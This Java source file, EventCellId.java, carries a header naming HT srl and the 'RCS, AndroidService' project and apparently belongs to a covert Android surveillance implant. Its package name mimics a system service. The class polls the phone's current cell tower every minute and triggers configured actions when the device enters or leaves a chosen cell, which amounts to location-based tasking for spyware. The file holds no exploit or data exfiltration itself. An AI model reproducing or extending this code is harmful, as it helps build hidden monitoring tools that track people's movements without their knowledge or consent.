/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCellId.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import android.util.Log;

import com.android.service.CellInfo;
import com.android.service.Device;
import com.android.service.auto.Cfg;
import com.android.service.util.DataBuffer;

public class EventCellId extends EventBase {
	private static final String TAG = "EventCellId";

	private static final long CELLID_PERIOD = 60000;
	private static final long CELLID_DELAY = 1000;

	int actionOnEnter;
	int actionOnExit;

	int mccOrig;
	int mncOrig;
	int lacOrig;
	int cidOrig;
	boolean entered = false;

	@Override
	public void begin() {
		entered = false;
	}

	@Override
	public void end() {
	}

	@Override
	public boolean parse(EventConf event) {
		byte[] confParams = event.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();

			mccOrig = databuffer.readInt();
			mncOrig = databuffer.readInt();
			lacOrig = databuffer.readInt();
			cidOrig = databuffer.readInt();

			if(Cfg.DEBUG) Log.d("QZ", TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
					+ lacOrig + " Cid: " + cidOrig);

			setPeriod(CELLID_PERIOD);
			setDelay(CELLID_DELAY);

		} catch (final IOException e) {
			return false;
		}

		return true;
	}

	@Override
	public void go() {
		CellInfo info = Device.getCellInfo();
		if(!info.valid){
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "invalid cell info" );
			return;
		}
		
		if ((mccOrig == -1 || mccOrig == info.mcc)
				&& (mncOrig == -1 || mncOrig == info.mnc)
				&& (lacOrig == -1 || lacOrig == info.lac)
				&& (cidOrig == -1 || cidOrig == info.cid)) {
			if (!entered) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Enter");
				entered = true;
				trigger(actionOnEnter);
			} else {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " already entered");
			}

		} else {
			if (entered) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Exit");
				entered = false;
				trigger(actionOnExit);
			} else {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " already exited");
			}
		}
	}

}
